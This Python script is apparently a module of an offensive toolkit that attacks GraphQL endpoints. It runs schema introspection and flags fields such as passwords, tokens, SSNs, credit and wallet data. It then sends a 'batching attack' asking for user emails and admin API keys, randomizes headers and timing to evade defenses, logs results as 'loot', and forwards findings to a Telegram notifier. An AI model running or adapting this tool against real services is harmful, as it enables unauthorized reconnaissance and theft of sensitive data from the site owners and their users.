#!/usr/bin/env python3
"""
GRAPHQL_INTROSPECTOR.PY v8.6 — GraphQL Schema Introspection & Query Batching Utility
"""
import asyncio
import hashlib
import json
import sys

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof
from modules.transport import SecureTransport

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          name
          description
          type { name kind ofType { name kind } }
        }
        type { name kind ofType { name kind } }
      }
    }
  }
}
"""

_background_tasks: set[asyncio.Task] = set()


def terminal(message, color=COLORS["RESET"]):
    sys.stdout.write(f"{color}{message}{COLORS['RESET']}\n")
    sys.stdout.flush()


async def broadcast_tg_alert_async(loot_type, details):
    try:
        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=8)
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


def _looks_like_html_or_challenge(body: str) -> bool:
    lower = (body or "").lstrip().lower()
    return any(
        marker in lower
        for marker in (
            "<!doctype html",
            "<html",
            "<title>security check</title>",
            "cf-browser-verification",
            "attention required!",
        )
    )


class GraphQLIntrospector:
    def __init__(self, target_url):
        self.target_url = (target_url or "").rstrip("/")
        self.transport = SecureTransport(self.target_url)

    def close(self):
        close_fn = getattr(self.transport, "close", None)
        if callable(close_fn):
            try:
                close_fn()
            except Exception:
                pass

    def run_introspection(self, graphql_endpoint="/graphql"):
        terminal(
            f"\n[***] INITIATING GRAPHQL SCHEMA INTROSPECTION [{self.target_url}{graphql_endpoint}] [***]",
            COLORS["MAGENTA"],
        )

        apply_behavioral_jitter()

        random_headers = dict(get_randomized_hints())
        random_headers["Content-Type"] = "application/json"

        payload = {"query": INTROSPECTION_QUERY}

        try:
            status, headers, body = self.transport.request(
                "POST",
                graphql_endpoint,
                payload=payload,
                extra_headers=random_headers,
            )
        except Exception as exc:
            terminal(f"[-] Transport request failed: {exc}", COLORS["RED"])
            return None

        if status not in (200, 201):
            terminal(f"[-] GraphQL introspection endpoint returned HTTP {status}", COLORS["YELLOW"])
            return None

        body_str = body if isinstance(body, str) else str(body or "")
        if _looks_like_html_or_challenge(body_str):
            terminal("[-] GraphQL endpoint returned HTML/challenge page rather than JSON schema.", COLORS["YELLOW"])
            return None

        try:
            data = json.loads(body_str)
        except Exception as exc:
            terminal(f"[-] Non-JSON GraphQL response ({exc})", COLORS["YELLOW"])
            return None

        if not isinstance(data, dict):
            return None

        if "errors" in data and not data.get("data"):
            terminal(f"[-] GraphQL introspection disabled or rejected: {data['errors']}", COLORS["YELLOW"])
            return None

        schema_data = (data.get("data") or {}).get("__schema")
        if not isinstance(schema_data, dict):
            terminal("[-] Response did not contain a valid __schema object.", COLORS["YELLOW"])
            return None

        types = schema_data.get("types") or []
        if not types:
            return None

        terminal(
            f"[+] GraphQL Schema Introspected Successfully! Total Types Discovered: {len(types)}",
            COLORS["GREEN"],
        )

        sensitive_fields_found = []
        exposed_mutations = []

        for t in types:
            if not isinstance(t, dict):
                continue
            t_name = t.get("name", "")
            if t_name.startswith("__"):
                continue

            if t.get("kind") == "OBJECT":
                for f in (t.get("fields") or []):
                    if not isinstance(f, dict):
                        continue
                    f_name = str(f.get("name", "")).lower()
                    if any(
                        s in f_name
                        for s in ("password", "token", "secret", "private", "ssn", "credit", "admin", "wallet")
                    ):
                        sensitive_fields_found.append(f"{t_name}.{f.get('name')}")

            if t_name.lower() in ("mutation", "rootmutation") and t.get("fields"):
                for m in t.get("fields", []):
                    if isinstance(m, dict):
                        exposed_mutations.append(m.get("name"))

        loot_hash = hashlib.sha256(body_str.encode("utf-8", errors="ignore")).hexdigest()

        findings = {
            "endpoint": graphql_endpoint,
            "total_types": len(types),
            "sensitive_fields": sensitive_fields_found,
            "exposed_mutations": exposed_mutations,
            "integrity_hash": loot_hash,
            "schema_sample": body_str[:1000],
        }

        if sensitive_fields_found:
            terminal(
                f"[***] CRITICAL: Found {len(sensitive_fields_found)} sensitive fields in GraphQL schema!",
                COLORS["RED"],
            )
            for sf in sensitive_fields_found[:10]:
                terminal(f"  └── {sf}", COLORS["YELLOW"])

        stream_proof(
            "GRAPHQL_INTROSPECTION_SUCCESS",
            graphql_endpoint,
            {"query": "__schema", "hash": loot_hash},
            body_str[:500],
            findings,
        )

        save_session_loot(
            target=self.target_url,
            endpoint=graphql_endpoint,
            finding_type="GRAPHQL_INTROSPECTION_SUCCESS",
            status=status,
            headers=headers if isinstance(headers, dict) else {},
            body=body_str,
            extra_loot=findings,
        )

        broadcast_tg_alert_sync("GraphQL Introspection Confirmed", findings)
        return findings

    def run_batching_attack(self, graphql_endpoint="/graphql", queries=None):
        terminal(
            f"\n[***] INITIATING GRAPHQL QUERY BATCHING PROBE [{self.target_url}{graphql_endpoint}] [***]",
            COLORS["MAGENTA"],
        )
        apply_behavioral_jitter()

        if not queries:
            queries = [
                {"query": "{ __typename }"},
                {"query": "{ users { id email } }"},
                {"query": "{ adminSettings { apiKey } }"},
            ]

        random_headers = dict(get_randomized_hints())
        random_headers["Content-Type"] = "application/json"

        try:
            status, headers, body = self.transport.request(
                "POST",
                graphql_endpoint,
                payload=queries,
                extra_headers=random_headers,
            )

            body_str = body if isinstance(body, str) else str(body or "")
            if status in (200, 201) and body_str and not _looks_like_html_or_challenge(body_str):
                try:
                    parsed = json.loads(body_str)
                except Exception:
                    parsed = None

                has_valid_batch_data = False
                if isinstance(parsed, list):
                    has_valid_batch_data = any(isinstance(item, dict) and "data" in item for item in parsed)
                elif isinstance(parsed, dict):
                    has_valid_batch_data = "data" in parsed

                if has_valid_batch_data:
                    terminal(f"[+] Query batching returned GraphQL data [HTTP {status}]", COLORS["GREEN"])
                    terminal(f"  └── Batch Response Preview: {body_str[:300]}", COLORS["CYAN"])

                    loot_hash = hashlib.sha256(body_str.encode("utf-8", errors="ignore")).hexdigest()
                    loot_data = {
                        "endpoint": graphql_endpoint,
                        "batch_size": len(queries),
                        "status": status,
                        "integrity_hash": loot_hash,
                        "response_sample": body_str[:800],
                    }

                    stream_proof(
                        "GRAPHQL_BATCHING_SUCCESS",
                        graphql_endpoint,
                        {"batch_size": len(queries), "hash": loot_hash},
                        body_str[:300],
                        loot_data,
                    )
                    save_session_loot(
                        target=self.target_url,
                        endpoint=graphql_endpoint,
                        finding_type="GRAPHQL_BATCHING_SUCCESS",
                        status=status,
                        headers=headers if isinstance(headers, dict) else {},
                        body=body_str,
                        extra_loot=loot_data,
                    )
                    broadcast_tg_alert_sync("GraphQL Query Batching Success", loot_data)
                    return loot_data

            terminal(f"[-] Batching probe returned HTTP {status} (no GraphQL batch data).", COLORS["YELLOW"])
        except Exception as exc:
            terminal(f"[-] Batching probe error: {exc}", COLORS["RED"])

        return None


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.invalid"
    inspector = GraphQLIntrospector(target)
    try:
        inspector.run_introspection("/graphql")
        inspector.run_batching_attack("/graphql")
    finally:
        inspector.close()
